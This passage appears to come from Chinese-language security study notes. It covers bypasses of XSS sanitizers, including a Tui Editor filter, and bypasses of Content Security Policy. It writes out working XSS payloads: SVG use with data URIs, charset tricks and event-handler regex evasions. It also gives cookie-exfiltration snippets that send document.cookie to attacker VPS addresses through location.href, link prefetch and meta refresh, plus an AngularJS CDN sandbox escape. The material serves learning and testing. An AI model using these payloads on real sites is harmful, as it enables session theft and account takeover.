&#123;</span><br><span class=\"line\">      node.<span class=\"title function_\">removeAttribute</span>(attr.<span class=\"property\">name</span>);</span><br><span class=\"line\">      <span class=\"comment\">// Shift the array to continue looping.</span></span><br><span class=\"line\">      a = a - <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Sanitize children</span></span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, node);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">while</span> ((node = treeWalker.<span class=\"title function_\">nextSibling</span>()));</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x tabindex=0 onfocus=alert(document.cookie)&gt;&lt;input id=attributes&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"tui_editor\"><a class=\"markdownIt-Anchor\" href=\"#tui_editor\">#</a> Tui_editor</h2>\n<p>常见的 Markdown 渲染器对于 XSS 问题有两种处理方式：</p>\n<ul>\n<li>在渲染的时候格外注意，在写入标签和属性的时候进行实体编码</li>\n<li>渲染时不做任何处理，渲染完成以后再将整个数据作为富文本进行过滤</li>\n</ul>\n<p>相比起来，后一种方式更加安全（它的安全主要取决于富文本过滤器的安全性）。前一种方式的优势是，不会因为二次过滤导致丢失一些正常的属性，另外少了一遍处理效率肯定会更高，它的缺点是一不注意就可能出问题，另外也不支持直接在 Markdown 里插入 HTML。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MTQwMDM2NTItZWUzMDYwMjItZTMxMS00N2Y5LWJkYjYtYzAzOWYwN2NmMTNmLm1k\">📎Tui Editor 的 bypass 之路.md</span></p>\n<blockquote>\n<p>过滤过程是：</p>\n<ol>\n<li>先正则直接去除注释与 onload 属性的内容</li>\n<li>将上面处理后的内容，赋值给一个新创建的 div 的 innerHTML 属性，建立起一颗 DOM 树</li>\n<li>用黑名单删除掉一些危险 DOM 节点，比如 iframe、script 等</li>\n<li>用白名单对属性进行一遍处理，处理逻辑是\n<ul>\n<li>只保留白名单里名字<strong>开头</strong>的属性</li>\n<li>对于满足正则 <code>/href|src|background/i</code>  的属性，进行额外处理</li>\n</ul>\n</li>\n<li>处理完成后的 DOM，获取其 HTML 代码返回</li>\n</ol>\n</blockquote>\n<p>绕过 1：</p>\n<p>使用 SVG 的 use 标签，use 的作用是引用本页面或第三方页面的另一个 svg 元素，比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;</span><br><span class=\"line\">    &lt;circle id=&quot;myCircle&quot; cx=&quot;5&quot; cy=&quot;5&quot; r=&quot;4&quot; stroke=&quot;blue&quot;/&gt;</span><br><span class=\"line\">    &lt;use href=&quot;#myCircle&quot;&gt;&lt;/use&gt;</span><br><span class=\"line\">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>use 的 href 属性指向那个被它引用的元素。但与 a 标签的 href 属性不同的是，use href 不能使用 JavaScript 伪协议，但可以使用 data: 协议。</p>\n<p>比如：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javascript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>data 协议中的文件必须是一个完整的 svg，而且整个 data URL 的末尾，需要有一个锚点 <code>#x</code>  来指向内部这个被引用的 svg。</p>\n<p>对于 XSS sanitizer 来说，这个 Payload 只有 svg、use 两个标签和 href 一个属性，但因为 use 的引用特性，所以 data 协议内部的 svg 也会被渲染出来。</p>\n<p>data 协议，base64 编码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyAKICAgIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nMTAwJyBoZWlnaHQ9JzEwMCc+PGEgeGxpbms6aHJlZj0namF2YXNjcmlwdDphbGVydCgxKSc+PHJlY3QgeD0nMCcgeT0nMCcgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnIC8+PC9hPjwvc3ZnPg#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>绕过 2：</p>\n<p>ISO-2022-JP 编码</p>\n<p>ISO-2022-JP 编码在解析的时候会忽略 <code>\\x1B\\x28\\x42</code> ，也就是 <code>%1B%28B</code> 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;use href=&quot;data:image/svg+xml;charset=ISO-2022-JP,&lt;svg id=&#x27;x&#x27; xmlns=&#x27;http://www.w3.org/2000/svg&#x27; xmlns:xlink=&#x27;http://www.w3.org/1999/xlink&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27;&gt;&lt;a xlink:href=&#x27;javas%1B%28Bcript:alert(1)&#x27;&gt;&lt;rect x=&#x27;0&#x27; y=&#x27;0&#x27; width=&#x27;100&#x27; height=&#x27;100&#x27; /&gt;&lt;/a&gt;&lt;/svg&gt;#x&quot;&gt;&lt;/use&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>即三种方式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">base64</span><br><span class=\"line\">Chrome ISO-<span class=\"number\">2022</span>-JP</span><br><span class=\"line\">&lt;details ontoggle=<span class=\"string\">&quot;alert(1)&quot;</span>&gt; </span><br></pre></td></tr></table></figure>\n<p>或</p>\n<p>通过条件竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;details open ontoggle=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>补丁绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export const TAG_NAME = &#x27;[A-Za-z][A-Za-z0-9-]*&#x27;;</span><br><span class=\"line\">const reXSSOnload = new RegExp(`(&lt;$&#123;TAG_NAME&#125;[^&gt;]*)(onload\\s*=)`, &#x27;ig&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">export function sanitizeHTML(html: string) &#123;</span><br><span class=\"line\">    const root = document.createElement(&#x27;div&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (isString(html)) &#123;</span><br><span class=\"line\">        html = html.replace(reComment, &#x27;&#x27;).replace(reXSSOnload, &#x27;$1&#x27;);</span><br><span class=\"line\">        root.innerHTML = html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>1. 贪婪模式导致绕过</p>\n<p>正则在标签名 <code>[A-Za-z][A-Za-z0-9-]*</code>  的后面，使用了 <code>[^&gt;]*</code>  来匹配非 <code>&gt;</code>  的所有字符。</p>\n<p>如果此时有两个 <code>onload=</code> ，那么这个 <code>[^&gt;]*</code>  将会匹配到第二个，而将它删除掉，而第一个 <code>onload=</code>  将被保留。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;&lt;/svg&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>\n<p>2. 非贪婪绕过</p>\n<p>即使改成非贪婪模式，删除掉的是第一个 <code>onload=</code> ，第二个 <code>onload=</code>  仍然会保留，所以无法解决问题，构造的 Payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>\n<p>正则优化：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(&lt;[A-Za-z][A-Za-z0-9-]*\\s)([onload=]*))</span><br></pre></td></tr></table></figure>\n<p>3. 字符匹配导致问题</p>\n<p>如果这个正则匹配上 HTML 属性中的一个 <code>&gt;</code> ，则会停止向后匹配，这样 <code>onload=</code>  也能保留下来。Payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>总结</p>\n<p>1. 用户交互型</p>\n<blockquote>\n<p>svg use 属性，base64 编码，绕过 JavaScript 关键字</p>\n<p>svg use 属性，charset=ISO-2022-jp，Chrome 忽略特定字符，导致 JavaScript 关键字消失</p>\n</blockquote>\n<p>2. 非用户交互型</p>\n<blockquote>\n<p>1. 条件竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload&gt;</span><br><span class=\"line\">&lt;detail ontoggle=alert(1)&gt; //在黑名单删除details标签前，就已经将ontoggle事件加载进事件队列中即使删除也会执行</span><br></pre></td></tr></table></figure>\n<p>2. 绕过补丁</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.绕过贪婪匹配</span><br><span class=\"line\">由于贪婪匹配一直会匹配到没有匹配的元素为止，利用两个onload，将会忽略第一个onlad</span><br><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;</span><br><span class=\"line\">2.绕过非贪婪匹配</span><br><span class=\"line\">由于非贪婪只匹配第一个元素，导致第一个onload被删除，第二个onload得以保留</span><br><span class=\"line\">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br><span class=\"line\">3.字符匹配</span><br><span class=\"line\">正则表达式遇到&gt;就结束</span><br><span class=\"line\">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h2 id=\"csp\"><a class=\"markdownIt-Anchor\" href=\"#csp\">#</a> CSP</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMjE3NTEtZDhmZmI2YTQtYzJhYi00YzRhLWE1N2YtMGQ1MDY2NDVmZWIyLm1k\">📎CSP 常规绕过思路.md</span></p>\n<p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以</p>\n<p><strong>通过响应包头（Response Header）实现：</strong></p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-policy</span>: <span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; <span class=\"keyword\">script-src</span> <span class=\"string\">&#x27;self&#x27;</span> allowed.com; <span class=\"keyword\">img-src</span> <span class=\"string\">&#x27;self&#x27;</span> allowed.com; <span class=\"keyword\">style-src</span> <span class=\"string\">&#x27;self&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>通过 HTML 元标签实现：</strong></p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;<span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; <span class=\"keyword\">img-src</span> https://*; <span class=\"keyword\">child-src</span> <span class=\"string\">&#x27;none&#x27;</span>;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>除了 Content-Security-Policy，还有一个 Content-Security-Policy-Report-Only 字段，表示不执行限制选项，只是记录违反限制的行为。它必须与 report-uri 选项配合使用。</p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy-Report-Only</span>: <span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; ...; <span class=\"keyword\">report-uri</span> /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>\n<h3 id=\"csp指令值\"><a class=\"markdownIt-Anchor\" href=\"#csp指令值\">#</a> CSP 指令值</h3>\n<p>介绍完 CSP 的指令，下面介绍一下指令值，即允许或不允许的资源</p>\n<blockquote>\n<ul>\n<li>*： 星号表示允许任何 URL 资源，没有限制；</li>\n<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>\n<li>data：仅允许数据模式（如 Base64 编码的图片）方式加载资源；</li>\n<li>none：不允许任何资源被加载；</li>\n<li>unsafe-inline：允许使用内联资源，例如内联 <code>&lt;script&gt;</code>  标签，内联事件处理器，内联 <code>&lt;style&gt;</code>  标签等，但出于安全考虑，不建议使用；</li>\n<li>nonce：通过使用一次性加密字符来定义可以执行的内联 js 脚本，服务端生成一次性加密字符并且只能使用一次；</li>\n</ul>\n</blockquote>\n<p>下面通过具体的例子来看看 CSP 指令和指令值的用法：</p>\n<blockquote>\n<p><code>&lt;img src=image.jpg&gt;</code>  该图片来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz1zVml1bndJZVJJN3Z1TSUyRkhOR0NNcUElM0QlM0QuWEJKcDJWbUhSTEpkblE4SCUyQk1LbmZxS3JqampabEh6b0h1eXltTXB2VktRJTNE\"> https://example.com</span> 将被允许载入，因为是同源资源；</p>\n<p><code>&lt;script src=script.js&gt;</code>  该 js 脚本来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz13bXlvQ05zZnZhTVdUckxuZWREZkJRJTNEJTNELjBKWmNPNSUyRnowS1dOcWVlb0V1QWVVSXJsVVRmRFlwd3RUTGp0QlFUaXFEMCUzRA==\"> https://example.com</span> 将被允许载入，因为是同源资源；</p>\n<p><code>&lt;script src=https://examples.com/script.js&gt;</code> ，该 js 脚本将不允许被加载执行，因为来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz11NnE3QXR2M0t6RTFGbWtRaXJCeE1nJTNEJTNELjdQQm81JTJGWUs3bU5wSVZZNkUlMkZ0Z082ME5PZE1YUWlOUUtpeTBFbzZOUk9ZJTNE\"> https://examples.com</span>， 非同源；</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE2LzA5L2NzcC5odG1s\">Content Security Policy 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)</span></p>\n<p>CSP 绕过</p>\n<p>1.location.href 绕过</p>\n<p>服务端代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;unsafe-inline&#x27;&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;//</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>本地代码，模拟接收 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tif (isset($_GET[&#x27;xss&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content&quot;.@$_GET[&#x27;xss&#x27;];</span><br><span class=\"line\">    &#125;//</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>这个地方可以用 location 跳转：location.href (window.location/window.open) 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a=&lt;script&gt;location.href=&quot;http://127.0.0.1&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>在我们已经可以执行任意 js 脚本但由于 CSP 的阻拦我们的 cookie 无法带外传输，就可以用此方法，注意编码 %2B</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br><span class=\"line\">http://101.35.139.208:9999/csp.php?a=&lt;script&gt;location.href=&quot;http://127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>利用前提：存在 XSS，可以执行任意 js 脚本，但由于 CSP 无法数据外带。</p>\n<p>CSP 规则 <code>header(&quot;Content-Security-Policy: default-src 'self';script-src:'unsafe-inline';&quot;);</code></p>\n<p>2.link 绕过 (失效)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- firefox --&gt;</span><br><span class=\"line\">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- chrome --&gt;</span><br><span class=\"line\">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>外带：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var link = document.createElement(&quot;link&quot;);</span><br><span class=\"line\">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class=\"line\">link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);</span><br><span class=\"line\">document.head.appendChild(link);</span><br></pre></td></tr></table></figure>\n<p>3.meta 跳转绕过</p>\n<p>与 link 标签原理相似，利用 meta 标签实现网页跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/csp.php?xss=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://150.158.188.194:7890/&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p>meta 可以控制缓存（在 header 没有设置的情况下），有时候可以用来绕过 CSP nonce。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>外带 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var ometa = document.createElement(&quot;meta&quot;);</span><br><span class=\"line\">ometa.setAttribute(&quot;http-equiv&quot;, &quot;refresh&quot;);</span><br><span class=\"line\">ometa.setAttribute(&quot;content&quot;, &quot;1;url=127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie);</span><br><span class=\"line\">document.head.appendChild(ometa);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>4.iframe 标签绕过</p>\n<p><strong>同源</strong> ，当一个同源站点存在两个页面，我们称它们为 A 页面和 B 页面，假如 A 页面有 CSP 保护，而 B 页面没有，我们就可以直接在 B 页面新建 <code>iframe</code>  用 js 操作 A 页面的 DOM，也就是说 A 页面的 CSP 防护完全失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- A页面 --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- B页面 --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 下面模拟XSS --&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var iframe = document.createElement(&#x27;iframe&#x27;);</span><br><span class=\"line\">iframe.src=&quot;http://127.0.0.1/a.php&quot;;</span><br><span class=\"line\">document.body.appendChild(iframe);</span><br><span class=\"line\">setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&#x27;flag&#x27;).innerHTML),1000);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>前提条件：主站需要有 xss，需要拿到分站权限</p>\n<p>5.CDN 绕过</p>\n<p>通过白名单中的 cdn 存在漏洞绕过 CSP</p>\n<p>hackmd CSP</p>\n<p>该 md CSP 政策还允许了 <code>https://cdnjs.cloudflare.com/</code>  这个 js hosting 服务，这个提供了很多第三方的函数库以供引入，这样我们就可以直接借助 AngularJS 函数库以及 Client-Side Template Injection 里面成熟的沙盒逃逸技术绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- foo=&quot;--&gt;</span><br><span class=\"line\">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;div ng-app&gt;</span><br><span class=\"line\">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>\n<p>6. 站点静态资源可控绕过</p>\n<ul>\n<li>存在可控静态资源</li>\n<li>站点在 CSP 允许名单中</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;</span><br><span class=\"line\">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure>\n<p>7. 不完整 script 绕过</p>\n<p>只适用于火狐，且只能 <code>&lt;?php echo $_GET['xss']?&gt; &lt;script nonce='xxx××'&gt;</code>  相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性</p>\n<p><code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code></p>\n<p><code>&lt;script</code>  就会被变成一个属性，值为空，之后的 <code>nonce='xxxxx'</code></p>\n<p>会被当成我们输入的 script 标签中的一个属性</p>\n<ul>\n<li>可控点在合法 script 